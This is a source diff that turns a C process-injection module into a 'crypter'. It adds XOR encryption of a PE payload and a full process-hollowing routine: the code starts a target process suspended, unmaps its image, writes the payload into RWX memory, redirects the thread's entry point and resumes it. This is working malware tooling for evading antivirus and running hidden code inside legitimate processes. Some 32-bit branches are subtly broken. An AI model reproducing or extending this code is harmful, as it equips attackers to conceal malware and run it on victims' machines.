@@ -1,120 +1,179 @@
 /**
- * injector.c
+ * crypter.cpp
  */
 
 #include <stdio.h>
-#include <stddef.h>
+#include <stdlib.h>
 #include <windows.h>
-#include "injector.h"
+#include "crypter.h"
 
+/* ... */
 typedef struct pe_module {
-    char *bytes;
-    size_t length;
-    IMAGE_DOS_HEADER *dos_hdr;
-    IMAGE_NT_HEADERS *nt_hdrs;
+    PIMAGE_DOS_HEADER dos_hdr;
+    PIMAGE_NT_HEADERS nt_hdrs;
 #ifdef _WIN64
-    unsigned long long pref_base;
+    unsigned long long base;
 #else
-    unsigned long pref_base;
+    unsigned long base;
 #endif
 } pe_module_t;
 
+/* ... */
 typedef struct process {
-    void *handler;
-    void *thread;
-    CONTEXT context;
+    STARTUPINFOA startup_info;
+    PROCESS_INFORMATION proc_info;
+    CONTEXT thread_ctx;
 } process_t;
 
-void pe_module_init(pe_module_t *pem, char *bytes);
+/* ... */
+void pe_module_init(pe_module_t *pem, pe_data_t *pe_data);
+
+/* ... */
 int pe_module_allocate(pe_module_t *pem, process_t *proc, void **alloc_base);
-int pe_module_relocate(pe_module_t *pem, char *bytes, void *alloc_base);
-int pe_module_write_headers(pe_module_t *pem, process_t *proc, char *bytes, void *alloc_base);
-int pe_module_write_sections(pe_module_t *pem, process_t *proc, char *bytes, void *alloc_base);
 
+/* ... */
+int pe_module_relocate(pe_module_t *pem, pe_data_t *pe_data, void *alloc_base);
+
+/* ... */
+int pe_module_write_headers(pe_module_t *pem, process_t *proc, pe_data_t *pe_data, void *alloc_base);
+
+/* ... */
+int pe_module_write_sections(pe_module_t *pem, process_t *proc, pe_data_t *pe_data, void *alloc_base);
+
+/* ... */
 int process_init(process_t *proc, char *target);
-int process_set_context(process_t *proc, pe_module_t *pem, void *alloc_base);
 
-int injector_exec(char *bytes, char *target)
+/* ... */
+int process_set_thread_ctx(process_t *proc, pe_module_t *pem, void *alloc_base);
+
+int pe_data_read(pe_data_t *pe_data, char *filename)
+{
+    FILE *fp = fopen(filename, "rb");
+    if (!fp) {
+        return 0;
+    }
+
+    fseek(fp, 0, SEEK_END);
+    pe_data->size = ftell(fp);
+    rewind(fp);
+
+    pe_data->bytes = (char*)malloc(sizeof(char) * pe_data->size);
+    fread(pe_data->bytes, pe_data->size, 1, fp);
+
+    fclose(fp);
+    return 1;
+}
+
+int pe_data_write(pe_data_t *pe_data, char *filename)
+{
+    FILE *fp = fopen(filename, "wb");
+    if (!fp) {
+        return 0;
+    }
+
+    fwrite(pe_data->bytes, sizeof(char), pe_data->size, fp);
+
+    fclose(fp);
+    return 1;
+}
+
+void pe_data_encrypt(pe_data_t *pe_data, char *key)
+{
+    for (size_t i = 0; i < pe_data->size; ++i) {
+        pe_data->bytes[i] = pe_data->bytes[i] ^ key[i % strlen(key)];
+    }
+}
+
+void pe_data_decrypt(pe_data_t *pe_data, char *key)
+{
+    for (size_t i = 0; i < pe_data->size; ++i) {
+        pe_data->bytes[i] = pe_data->bytes[i] ^ key[i % strlen(key)];
+    }
+}
+
+int pe_data_inject(pe_data_t *pe_data, char *target)
 {
     pe_module_t pem;
-    pe_module_init(&pem, bytes);
+    pe_module_init(&pem, pe_data);
 
     process_t proc;
     if (!process_init(&proc, target)) {
         return 0;
     }
-    
-    printf("-1\n");
 
     void *alloc_base;
     if (!pe_module_allocate(&pem, &proc, &alloc_base)) {
         return 0;
     }
-    
-    printf("0\n");
-    
-    if (!pe_module_relocate(&pem, bytes, alloc_base)) {
-        return 0;
-    }
-    
-    printf("1\n");
 
-    if (!process_set_context(&proc, &pem, alloc_base)) {
-        return 0;
-    }
-    
-    printf("2\n");
-
-    if (!pe_module_write_headers(&pem, &proc, bytes, alloc_base)) {
+    if (!pe_module_relocate(&pem, pe_data, alloc_base)) {
         return 0;
     }
 
-    if (!pe_module_write_sections(&pem, &proc, bytes, alloc_base)) {
+    if (!process_set_thread_ctx(&proc, &pem, alloc_base)) {
         return 0;
     }
 
-    if (ResumeThread(proc.handler) == -1) {
+    if (!pe_module_write_headers(&pem, &proc, pe_data, alloc_base)) {
+        return 0;
+    }
+
+    if (!pe_module_write_sections(&pem, &proc, pe_data, alloc_base)) {
+        return 0;
+    }
+
+    if (ResumeThread(proc.proc_info.hThread) == -1) {
         return 0;
     }
 
     return 1;
 }
 
-void pe_module_init(pe_module_t *pem, char *bytes)
+void pe_data_free(pe_data_t *pe_data)
 {
-    pem->dos_hdr = (IMAGE_DOS_HEADER*)bytes;
-    pem->nt_hdrs = (IMAGE_NT_HEADERS*)((LONG_PTR)bytes + pem->dos_hdr->e_lfanew);
-    pem->pref_base = pem->nt_hdrs->OptionalHeader.ImageBase;
+    /* free bytes allocated when reading pe file into memory */
+    free(pe_data->bytes);
+
+    /* zero-out fields for potential re-use */
+    pe_data->bytes = NULL;
+    pe_data->size = 0;
+}
+
+void pe_module_init(pe_module_t *pem, pe_data_t *pe_data)
+{
+    pem->dos_hdr = (PIMAGE_DOS_HEADER)pe_data->bytes;
+    pem->nt_hdrs = (PIMAGE_NT_HEADERS)((LONG_PTR)pe_data->bytes + pem->dos_hdr->e_lfanew);
+    pem->base = pem->nt_hdrs->OptionalHeader.ImageBase;
 }
 
 int pe_module_allocate(pe_module_t *pem, process_t *proc, void **alloc_base)
 {
 #ifdef _WIN64
-	void *img_base = (LPVOID)(proc->context.Rdx + 2 * sizeof(unsigned long long));
+	void *img_base = (LPVOID)(proc->thread_ctx.Rdx + 2 * sizeof(unsigned long long));
     unsigned long long orig_base;
 #else
-	void *img_base = (LPVOID)(proc.context.Ebx + 2 * sizeof(unsigned long));
+	void *img_base = (LPVOID)(proc.thread_ctx.Ebx + 2 * sizeof(unsigned long));
     unsigned long orig_base;
 #endif
 
     size_t num_bytes;
-    if (!ReadProcessMemory(proc->handler, img_base, &orig_base, sizeof(orig_base), &num_bytes)) {
+    if (!ReadProcessMemory(proc->proc_info.hProcess, img_base, &orig_base, sizeof(orig_base), &num_bytes)) {
         return 0;
     }
 
-    if ((void*)orig_base == (void*)pem->pref_base) {
+    if ((void*)orig_base == (void*)pem->base) {
         HMODULE ntdll = GetModuleHandleA("ntdll.dll");
         FARPROC unm_vw_of_sec = GetProcAddress(ntdll, "NtUnmapViewOfSection");
 
-        if ((*(long(*)(void*, void*))unm_vw_of_sec)(proc->handler, (void*)orig_base)) {
+        if ((*(long(*)(void*, void*))unm_vw_of_sec)(proc->proc_info.hProcess, (void*)orig_base)) {
             return 0;
         }
     }
 
-    if (!(*alloc_base = VirtualAllocEx(proc->handler, (void*)pem->pref_base, pem->nt_hdrs->OptionalHeader.SizeOfImage,
-            MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE))) {
+    if (!(*alloc_base = VirtualAllocEx(proc->proc_info.hProcess, (void*)pem->base,
+            pem->nt_hdrs->OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE))) {
         if (GetLastError() == ERROR_INVALID_ADDRESS) {
-            if (!(*alloc_base = VirtualAllocEx(proc->handler, NULL, pem->nt_hdrs->OptionalHeader.SizeOfImage,
+            if (!(*alloc_base = VirtualAllocEx(proc->proc_info.hProcess, NULL, pem->nt_hdrs->OptionalHeader.SizeOfImage,
                     MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE))) {
                 return 0;
             }
@@ -124,19 +183,20 @@ int pe_module_allocate(pe_module_t *pem, process_t *proc, void **alloc_base)
         }
     }
 
-    if ((void*)orig_base != *alloc_base && !WriteProcessMemory(proc->handler, img_base, alloc_base, sizeof(*alloc_base),
-            &num_bytes)) {
-        return 0;
+    if ((void*)orig_base != *alloc_base) {
+        if (!WriteProcessMemory(proc->proc_info.hProcess, img_base, alloc_base, sizeof(*alloc_base), &num_bytes)) {
+            return 0;
+        }
     }
 
     return 1;
 }
 
-int pe_module_relocate(pe_module_t *pem, char *bytes, void *alloc_base)
+int pe_module_relocate(pe_module_t *pem, pe_data_t *pe_data, void *alloc_base)
 {
     pem->nt_hdrs->OptionalHeader.Subsystem = IMAGE_SUBSYSTEM_WINDOWS_GUI;
 
-    if (alloc_base == (void*)pem->pref_base) {
+    if (alloc_base == (void*)pem->base) {
         return 1;
     }
 
@@ -164,7 +224,7 @@ int pe_module_relocate(pe_module_t *pem, char *bytes, void *alloc_base)
         }
     }
 
-    void *reloc_tbl = (void*)((DWORD_PTR)bytes + reloc_tbl_offs);
+    void *reloc_tbl = (void*)((DWORD_PTR)pe_data->bytes + reloc_tbl_offs);
     unsigned long reloc_tbl_size = pem->nt_hdrs->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].Size;
 
     unsigned long i = 0;
@@ -194,8 +254,8 @@ int pe_module_relocate(pe_module_t *pem, char *bytes, void *alloc_base)
                 }
 
 #ifdef _WIN64
-                unsigned long long *addr_fix = (unsigned long long*)((DWORD_PTR)bytes + addr_fix_offs);
-                *addr_fix += (unsigned long long)alloc_base - pem->pref_base;
+                unsigned long long *addr_fix = (unsigned long long*)((DWORD_PTR)pe_data->bytes + addr_fix_offs);
+                *addr_fix += (unsigned long long)alloc_base - pem->base;
 #else
                 unsigned long *addr_fix = (unsigned long*)((DWORD_PTR)pe_data->bytes + addr_fix_offs);
                 *addr_fix += (unsigned long)alloc_base - pem->base;
@@ -209,16 +269,16 @@ int pe_module_relocate(pe_module_t *pem, char *bytes, void *alloc_base)
     return 1;
 }
 
-int pe_module_write_headers(pe_module_t *pem, process_t *proc, char *bytes, void *alloc_base)
+int pe_module_write_headers(pe_module_t *pem, process_t *proc, pe_data_t *pe_data, void *alloc_base)
 {
     size_t num_bytes;
-    if (!WriteProcessMemory(proc->handler, alloc_base, (void*)bytes,
+    if (!WriteProcessMemory(proc->proc_info.hProcess, alloc_base, (void*)pe_data->bytes,
             pem->nt_hdrs->OptionalHeader.SizeOfHeaders, &num_bytes)) {
         return 0;
     }
 
     unsigned long old_prot;
-    if (!VirtualProtectEx(proc->handler, alloc_base, pem->nt_hdrs->OptionalHeader.SizeOfHeaders,
+    if (!VirtualProtectEx(proc->proc_info.hProcess, alloc_base, pem->nt_hdrs->OptionalHeader.SizeOfHeaders,
             PAGE_READONLY, &old_prot)) {
         return 0;
     }
@@ -226,9 +286,9 @@ int pe_module_write_headers(pe_module_t *pem, process_t *proc, char *bytes, void
     return 1;
 }
 
-int pe_module_write_sections(pe_module_t *pem, process_t *proc, char *bytes, void *alloc_base)
+int pe_module_write_sections(pe_module_t *pem, process_t *proc, pe_data_t *pe_data, void *alloc_base)
 {
-    IMAGE_SECTION_HEADER *sec_hdrs = (IMAGE_SECTION_HEADER*)((ULONG_PTR)bytes + pem->dos_hdr->e_lfanew +
+    IMAGE_SECTION_HEADER *sec_hdrs = (IMAGE_SECTION_HEADER*)((ULONG_PTR)pe_data->bytes + pem->dos_hdr->e_lfanew +
             sizeof(IMAGE_NT_HEADERS));
 
     for (int i = 0; i < pem->nt_hdrs->FileHeader.NumberOfSections; ++i) {
@@ -238,8 +298,8 @@ int pe_module_write_sections(pe_module_t *pem, process_t *proc, char *bytes, voi
         void *sec_addr = (void*)((unsigned long)alloc_base + sec_hdrs[i].VirtualAddress);
 #endif
         size_t num_bytes;
-        if (!WriteProcessMemory(proc->handler, sec_addr,
-                (const void*)((DWORD_PTR)bytes + sec_hdrs[i].PointerToRawData), sec_hdrs[i].SizeOfRawData,
+        if (!WriteProcessMemory(proc->proc_info.hProcess, sec_addr,
+                (const void*)((DWORD_PTR)pe_data->bytes + sec_hdrs[i].PointerToRawData), sec_hdrs[i].SizeOfRawData,
                 &num_bytes)) {
             return 0;
         }
@@ -279,7 +339,7 @@ int pe_module_write_sections(pe_module_t *pem, process_t *proc, char *bytes, voi
         }
 
         unsigned long old_prot;
-        if (!VirtualProtectEx(proc->handler, sec_addr, sec_size, sec_prot, &old_prot)) {
+        if (!VirtualProtectEx(proc->proc_info.hProcess, sec_addr, sec_size, sec_prot, &old_prot)) {
             return 0;
         }
     }
@@ -289,35 +349,30 @@ int pe_module_write_sections(pe_module_t *pem, process_t *proc, char *bytes, voi
 
 int process_init(process_t *proc, char *target)
 {
-    STARTUPINFOA startup_info;
-    PROCESS_INFORMATION proc_info;
-
-    if (!CreateProcessA(target, NULL, NULL, NULL, 0, CREATE_SUSPENDED, NULL, NULL, &startup_info, &proc_info)) {
+    if (!CreateProcessA(target, NULL, NULL, NULL, 0, CREATE_SUSPENDED, NULL, NULL, &proc->startup_info,
+            &proc->proc_info)) {
 		return 0;
 	}
 
-    proc->handler = proc_info.hProcess;
-    proc->thread = proc_info.hThread;
+    memset(&proc->thread_ctx, 0, sizeof(proc->thread_ctx));
+    proc->thread_ctx.ContextFlags = CONTEXT_INTEGER;
 
-    memset(&proc->context, 0, sizeof(proc->context));
-    proc->context.ContextFlags = CONTEXT_INTEGER;
-
-    if (!GetThreadContext(proc->thread, &proc->context)) {
+    if (!GetThreadContext(proc->proc_info.hThread, &proc->thread_ctx)) {
 		return 0;
 	}
 
     return 1;
 }
 
-int process_set_context(process_t *proc, pe_module_t *pem, void *alloc_base)
+int process_set_thread_ctx(process_t *proc, pe_module_t *pem, void *alloc_base)
 {
 #ifdef _WIN64
-    proc->context.Rcx = (unsigned long long)alloc_base + pem->nt_hdrs->OptionalHeader.AddressOfEntryPoint;
+    proc->thread_ctx.Rcx = (unsigned long long)alloc_base + pem->nt_hdrs->OptionalHeader.AddressOfEntryPoint;
 #else
-    proc.context.Eax = (unsigned long)alloc_base + pem.nt_hdrs->OptionalHeader.AddressOfEntryPoint;
+    proc.thread_ctx.Eax = (unsigned long)alloc_base + pem.nt_hdrs->OptionalHeader.AddressOfEntryPoint;
 #endif
 
-    if (!SetThreadContext(proc->handler, &proc->context)) {
+    if (!SetThreadContext(proc->proc_info.hThread, &proc->thread_ctx)) {
         return 0;
     }
 
